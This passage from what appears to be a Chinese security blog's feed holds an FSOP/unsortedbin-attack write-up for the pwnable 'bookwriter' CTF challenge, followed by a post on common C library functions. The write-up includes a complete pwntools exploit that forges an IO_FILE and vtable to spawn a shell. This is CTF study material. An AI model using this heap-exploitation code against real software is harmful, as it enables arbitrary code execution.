*/</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_end;<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_base;<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_end;<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">  <span class="type">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//宏定义,如果宏_IO_USE_OLD_IO_FILE会把_IO_FILE拆成两个部分</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">file</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001</span></span><br><span class="line">  _IO_off64_t _offset;</span><br><span class="line"><span class="meta"># <span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="type">void</span> *_freeres_buf;</span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line">  <span class="type">void</span> *__pad1;</span><br><span class="line">  <span class="type">void</span> *__pad2;</span><br><span class="line">  <span class="type">void</span> *__pad3;</span><br><span class="line">  <span class="type">void</span> *__pad4;</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line">  <span class="type">size_t</span> __pad5;</span><br><span class="line">  <span class="type">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class="line">  <span class="type">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="type">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="type">void</span> *) - <span class="keyword">sizeof</span> (<span class="type">size_t</span>)];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>IO_FILE_plus</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    _IO_FILE    file;</span><br><span class="line">    IO_jump_t   *vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>vtable</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>利用unsortedbin attack往IO_list_all中写入main_arena+0x58</p><p>由于_chain字段在_IO_FILE中的偏移是0x68</p><p>那么就会将真实大小为0x60chunk的bk字段视为_chain字段,故该bk需指向fake_IO_FILE</p><p>所以fake_IO_FILE需要被加入0x60的smallbin中,并确保是最后一个chunk</p><p>一般是触发从unsortedbin往外取出,放入smallbin后,继续取出(IO_list_all-0x10)但因为大小不通过检测,触发malloc_printer,以此getshell</p><p>IO_list_all-0x10视为chunk的话size字段是空的(固定内存)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;; )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">int</span> iters = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">      &#123;</span><br><span class="line">        bck = victim-&gt;bk;</span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">            || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">          malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                           chunk2mem (victim), av);</span><br></pre></td></tr></table></figure><p>不过在 2.24 版本的 glibc 中，全新加入了针对 IO_FILE_plus 的 vtable 劫持的检测措施，glibc 会在调用虚函数之前首先检查 vtable 地址的合法性。会验证 vtable 是否位于_IO_vtable 段中,这就使得这种办法失效了</p><h2 id="实战pwnable-bookwriter"><a href="#实战pwnable-bookwriter" class="headerlink" title="实战pwnable_bookwriter"></a>实战pwnable_bookwriter</h2><p>checksec</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/bw&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>libc是2.23</p><p>主要漏洞点:</p><ol><li>根据内存判断应该只能存储8个book,但是add函数判断时是if(a&gt;8)结合函数功能会将一个book的size覆写为一个地址(一个很大的数值)</li><li>edit函数后会将book的size根据新输入的字符串调整,如果和下一个chunk的size连接起来就可以多写一个字节到下一个chunk</li><li>author长度为0x40时,可以向下继续泄露地址</li></ol><p>利用核心:</p><ol><li>这题没有free功能,要想泄露libc就要对topchunk动手脚(本体可以修改其大小,再申请一个比修改后的size大的大小,使topchunk加入unsortedbin)</li><li>具体的漏洞利用实现要用到FSOP</li><li>topchunk在这道题中非常关键</li></ol><p>实现过程:</p><ol><li>泄露heap</li><li>通过topchunk进入unsortedbin泄露libc</li><li>第0个chunk大数字写伪造io_file和vtable</li><li>申请chunk利用unsortedbin attack写IO_file,并让fake_iofile加入到smallbin链并成功进入fake_io_list_all,并因为unsortedbin链损坏触发malloc_printer以此getshell</li></ol><p>触发trigger(将IO_list_all-0x10视为chunk起始的话,size==0)</p><p><strong>exp:</strong>(有小概率失败,可能是ASLR的影响)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">elf= ELF(<span class="string">&quot;./bw&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./bw&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;choice :&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;page :&#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">p.sendafter(<span class="string">b&#x27;Content :&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view</span>(<span class="params">idx</span>):</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;choice :&quot;</span>,<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;page :&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;choice :&quot;</span>,<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;page :&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">p.sendafter(<span class="string">b&quot;Content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;choice :&quot;</span>,<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">p.sendafter(<span class="string">b&#x27;Author :&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line"> </span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>)  <span class="comment">#top chunk size edit</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">24</span>+<span class="string">b&#x27;\xe1\x0f\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak heap</span></span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">64</span>)</span><br><span class="line">heap_addr = u64(p.recvline()[<span class="number">0</span>:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;(yes:1 / no:0) &#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x1000</span>,<span class="string">&#x27;a&#x27;</span>) <span class="comment">#add top chunk to unsorted bin</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x50</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">view(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">libc_addr  = u64(p.recvline()[<span class="number">0</span>:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">libc.address = libc_addr - <span class="number">0x3c4b78</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;libc_base: &#x27;</span>, <span class="built_in">hex</span>(libc.address))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;libc_addr:&#x27;</span>, <span class="built_in">hex</span>(libc_addr))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;system: &#x27;</span>,<span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;heap: &#x27;</span>,<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;_IO_list_all: &quot;</span> + <span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">data = <span class="string">b&#x27;\0&#x27;</span>*<span class="number">0x2b0</span></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\0&#x27;</span>+p64(<span class="number">0x61</span>)+p64(<span class="number">0</span>)+p64(libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]-<span class="number">0x10</span>)+p64(<span class="number">2</span>)+p64(<span class="number">3</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0xc0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0xd8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">vtable = heap_addr + <span class="number">0x2b0</span> +<span class="number">0xe0</span></span><br><span class="line">payload += p64(vtable)</span><br><span class="line">payload +=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,data + payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Size of page :&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x10</span>).encode())</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">FSOP</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="IO_FILE" scheme="https://ixout.github.io/tags/IO-FILE/"/>
    
    <category term="FSOP" scheme="https://ixout.github.io/tags/FSOP/"/>
    
  </entry>
  
  <entry>
    <title>一些常见但总记不清的c库函数和python方法</title>
    <link href="https://ixout.github.io/posts/38626/"/>
    <id>https://ixout.github.io/posts/38626/</id>
    <published>2023-07-16T13:21:36.000Z</published>
    <updated>2023-07-31T13:09:12.808Z</updated>
    
    <content type="html"><![CDATA[<h1 id="C"><a href="#C" class="headerlink" title="C"></a>C</h1><h2 id="fgets"><a href="#fgets" class="headerlink" title="fgets"></a>fgets</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`<span class="type">char</span> *<span class="title function_">fgets</span><span class="params">(<span class="type">char</span> *<span class="keyword">restrict</span> s, <span class="type">int</span> n, FILE *<span class="keyword">restrict</span> stream)</span>`;</span><br></pre></td></tr></table></figure><p>从流stream中读取n个字符并写入s字符串中</p><h1 id="isoc99-sscanf"><a href="#isoc99-sscanf" class="headerlink" title="__isoc99_sscanf"></a>__isoc99_sscanf</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __isoc99_sscanf(<span class="type">const</span> <span class="type">char</span> *<span class="keyword">restrict</span> s, <span class="type">const</span> <span class="type">char</span> *<span class="keyword">restrict</span> format, ...);</span><br></pre></td></tr></table></figure><p>从字符串s中按格式化字符串format写到指定位置</p><h2 id="fread"><a href="#fread" class="headerlink" title="fread"></a>fread</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">fread</span><span class="params">(<span class="type">void</span> *ptr, <span class="type">size_t</span> size, <span class="type">size_t</span> count, FILE *stream)</span>;</span><br></pre></td></tr></table></figure><p>其中，参数含义如下：</p><ul><li><code>ptr</code>：指向读取数据存储位置的指针；</li><li><code>size</code>：每个数据块的字节数；</li><li><code>count</code>：数据块的个数；</li><li><code>stream</code>：文件指针，指向要读取的文件。</li><li>函数返回值为实际读取的数据块数目，如果发生错误或者已经到达文件结尾，则返回值可能小于 <code>count</code>。</li></ul><h2 id="strtol"><a href="#strtol" class="headerlink" title="strtol"></a>strtol</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="type">int</span> <span class="title function_">strtol</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *nptr, <span class="type">char</span> **endptr, <span class="type">int</span> base)</span></span><br></pre></td></tr></table></figure><p>其中，参数含义如下：</p><ul><li><code>nptr</code>：要转换的字符串指针；</li><li><code>endptr</code>：可选输出参数，指向转换停止处的下一个字符的指针，如果该指针为 NULL，则不会返回该值；</li><li><code>base</code>：进制数，可以是 2 ~ 36 之间的任意值，或者特殊值 0，表示根据 <code>nptr</code> 的前缀来确定进制数（”0x” 或 “0X” 表示 16 进制，”0” 表示 8 进制，否则默认为 10 进制）。</li></ul><p>函数返回值为转换后的长整型数值。如果转换失败，返回值为 0，同时设置 <code>endptr</code> 为 <code>nptr</code>，并将 <code>errno</code> 设置为 <code>EINVAL</code> 或 <code>ERANGE</code>。</p><p>需要注意的是，由于 <code>strtol</code> 函数不支持无符号长整型，因此如果需要将字符串转换为无符号长整型，可以使用 <code>strtoul</code> 函数。</p><p>且strtol只能转换数字组成的字符串</p><h2 id="atoi"><a href="#atoi" class="headerlink" title="atoi"></a>atoi</h2><p>与前者相似</p><h2 id="sprintf"><a href="#sprintf" class="headerlink" title="sprintf"></a>sprintf</h2><p><code>int sprintf(char *str, const char *format, ...);</code></p><p>sprintf 的作用是将格式化的数据写入字符串中，根据格式化字符串中的占位符，将相应的数据转换成字符串，并将结果写入到目标字符串中。它在格式化字符串和实际数据之间建立了一个对应关系，方便将数据以指定的格式组合成字符串</p><p>主体依然是char *format</p><p><strong>但其本身并不具有打印功能</strong></p><h2 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">mmap</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> length, <span class="type">int</span> prot, <span class="type">int</span> flags, <span class="type">int</span> fd, <span class="type">off_t</span> offset)</span>;</span><br></pre></td></tr></table></figure><p>参数说明如下：</p><ul><li><p><code>addr</code>：指定映射的起始地址，通常设为0，表示由系统自动选择地址。</p></li><li><p><code>length</code>：指定映射的长度，以字节为单位。</p></li><li><p>```<br>prot</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  ：指定内存保护标志，用于限制对映射区域的访问权限。可以使用以下标志的按位或进行组合：</span><br><span class="line"></span><br><span class="line">  - `PROT_EXEC`：可执行权限，允许在映射区域中执行代码。</span><br><span class="line">  - `PROT_READ`：可读权限，允许读取映射区域中的内容。</span><br><span class="line">  - `PROT_WRITE`：可写权限，允许写入映射区域中的内容。</span><br><span class="line">  - `PROT_NONE`：无权限，禁止对映射区域进行任何访问。</span><br><span class="line"></span><br><span class="line">- ```</span><br><span class="line">  flags</span><br></pre></td></tr></table></figure><p>：指定映射的特性和行为，可以使用以下标志的按位或进行组合：</p><ul><li><code>MAP_SHARED</code>：共享映射，对映射区域的修改会影响到其他映射该文件的进程。</li><li><code>MAP_PRIVATE</code>：私有映射，对映射区域的修改不会影响到其他映射该文件的进程。</li><li><code>MAP_FIXED</code>：强制指定映射的起始地址，如果该地址已经被占用，则会失败。</li><li><code>MAP_ANONYMOUS</code>：创建一个匿名映射，不与具体的文件关联。</li></ul></li><li><p><code>fd</code>：指定要映射的文件的文件描述符。如果使用匿名映射，则将该参数设置为-1。</p></li><li><p><code>offset</code>：指定映射的文件偏移量，表示从文件的哪个位置开始映射。对于匿名映射，该参数应该设置为0。</p></li></ul><p>返回值为映射区域的起始地址，如果映射失败，则返回<code>MAP_FAILED</code>（-1）。</p><p>需要注意的是，mmap函数只能用于映射普通文件、设备文件或者匿名映射，不能用于映射目录文件。在使用完映射区域后，应当使用munmap函数来解除映射关系，释放对应的资源。</p><h2 id="memset"><a href="#memset" class="headerlink" title="memset"></a>memset</h2><p><code>void *memset(void *s, int c, size_t n);</code></p><p>参数说明如下：</p><ul><li><code>s</code>：指向要设置值的内存区域的指针。</li><li><code>c</code>：要设置的值，以整数形式表示。虽然该参数被声明为int类型，但实际上只使用了其低8位的值。</li><li><code>n</code>：要设置的内存区域的大小，以字节为单位。</li></ul><p>返回值为指向内存区域起始地址的指针，即参数<code>s</code>的值。</p><p>该函数将指定的值 <code>c</code> 复制到 <code>s</code> 指向的内存区域的前 <code>n</code> 个字节中，即将内存区域中的每个字节设置为相同的值。</p><p>需要注意的是，由于 <code>memset</code> 函数操作的是字节级别的赋值，对于非字符类型的数据（如整型、浮点型等），在使用 <code>memset</code> 进行赋值时，可能会出现不符合预期的结果。因此，对于非字符类型的数据，推荐使用其他适当的方式进行赋值操作。</p><h2 id="strtok"><a href="#strtok" class="headerlink" title="strtok"></a>strtok</h2><p><code>char *strtok(char *str, const char *delim);</code></p><ul><li><code>str</code>: 要被分割的字符串。在第一次调用时传入原始字符串，在后续调用中传入 <code>NULL</code>。</li><li><code>delim</code>: 分隔符字符串，用于指定在哪些字符上进行分割。</li></ul><p>每次调用 <code>strtok</code> 都会返回一个指向分割后子字符串的指针，并将原始字符串中的分隔符替换为 <code>NULL</code>。需要注意的是，在使用 <code>strtok</code> 函数时，原始字符串会被修改，因为分隔符被替换为 <code>NULL</code>。如果你需要保留原始字符串不变，可以先复制一份原始字符串，然后使用 <code>strtok</code> 函数来操作复制后的字符串。</p><p>注意事项：</p><ol><li><code>strtok</code> 函数会修改原始字符串，将分隔符位置替换为 <code>NULL</code>，所以在使用时要小心不要破坏原始数据。</li><li><code>strtok</code> 使用静态变量来记录分割的位置，所以不是线程安全的。在多线程环境中，可以使用 <code>strtok_r</code> 或其他线程安全的替代函数。</li></ol><h1 id="python"><a href="#python" class="headerlink" title="python"></a>python</h1>]]></content>
    
    
    <summary type="html">如题</summary>
    
    
    
    <category term="杂烩" scheme="https://ixout.github.io/categories/%E6%9D%82%E7%83%A9/"/>
    
    
    <category term="c库函数" scheme="https://ixout.github.io/tags/c%E5%BA%93%E5%87%BD%E6%95%B0/"/>
    
  </entry>
  
  <entry>
    <title>SunmerWeek1</title>
    <link href="https://ixout.github.io/posts/33429/"/>
    <id>https://ixout.github.io/posts/33429/</id>
    <published>2023-07-15T08:38:38.000Z</published>
    <updated>2023-07-30T11:42:59.505Z</updated>
    
